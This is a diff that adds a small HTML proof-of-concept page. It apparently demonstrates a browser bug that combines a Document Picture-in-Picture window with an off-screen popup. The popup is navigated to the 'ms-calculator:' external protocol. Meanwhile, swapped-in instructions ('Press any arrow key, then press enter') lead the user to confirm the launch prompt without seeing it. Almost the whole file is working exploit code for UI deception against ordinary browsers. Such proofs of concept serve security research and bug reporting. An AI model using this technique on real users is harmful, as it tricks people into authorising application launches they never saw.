@@ -1,0 +1,50 @@
+<!doctype html>
+<html>
+<head>
+<style>
+html { font-family: sans-serif; }
+#instructions { text-align: center; margin-top: 200px; font-size: 2em; }
+</style>
+</head>
+<body>
+<h1>PoC: Document PiP, external protocol (July 2025)</h1>
+<p id="instructions">Hold enter (or any key)</p>
+<script>
+var pipWindow;
+var newWin;
+
+var openPopup = () => {
+    if (!newWin || newWin.closed) {
+        newWin = window.open('about:blank', 'aotest', 'width=600,height=300,top=9000,left=9000');
+        // Move away from corner
+        newWin.moveBy(-50,-50);
+        newWin.eval(`setInterval(() => {
+            // Self-close popup if opener is reloaded or closed
+            if (!window.opener?.newWin) { window.close(); }
+        }, 800);`);
+        newWin.location = 'ms-calculator:';
+    }
+}
+
+var openPipWindow = async () => {
+    // Only open if there is no existing open PiP window
+    if (pipWindow && !pipWindow.closed) {
+        console.warn('PiP window already opened.');
+        return;
+    }
+
+    pipWindow = await documentPictureInPicture.requestWindow({ width: 9000, height: 9000 });
+    var styles = document.querySelector('style').innerText;
+    pipWindow.addEventListener('keydown', () => {
+        openPopup();
+        setTimeout(() => {
+            pipWindow.document.body.innerHTML = '<style>'+styles+'</style><p id="instructions">Press any arrow key, then press enter</p>';
+        // Wait for popup to open
+        }, 200);
+    });
+  }
+
+window.addEventListener('keydown', openPipWindow);
+</script>
+</body>
+</html>
